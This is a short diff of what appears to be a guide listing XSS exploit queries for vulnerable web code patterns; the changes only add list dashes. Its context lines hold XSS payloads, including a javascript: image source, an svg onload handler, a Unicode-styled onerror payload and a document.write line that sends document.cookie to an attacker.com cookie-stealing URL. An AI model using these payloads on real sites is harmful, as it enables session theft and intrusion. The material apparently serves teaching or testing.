@@ -81,7 +81,7 @@ Code example: @HtmlString("<img src='" + image + "'>")
 <img src="javascript:alert('XSS attack')">
 ```
 - Query to exploit document.write vulnerability:
-Code example: <script>document.write("<p>" + userContent + "</p>");</script>
+- Code example: <script>document.write("<p>" + userContent + "</p>");</script>
 ```
 <script>document.write("<img src='http://attacker.com/steal-cookie.php?cookie=" + document.cookie + "'>");</script>
 ```
@@ -90,7 +90,7 @@ If the code includes an API endpoint that returns an SVG image and/or other cont
 ```
 <svg onload=alert('XSS attack')>
 ```
-Query to exploit attribute value without quotes vulnerability:
+- Query to exploit attribute value without quotes vulnerability:
 <img src=@image>
 ```
 <𝚒𝚖𝚐 𝚜𝚛𝚌=𝚡 𝚘𝚗𝚎𝚛𝚛𝚘𝚛=𝚙𝚛𝚒𝚗𝚝()>
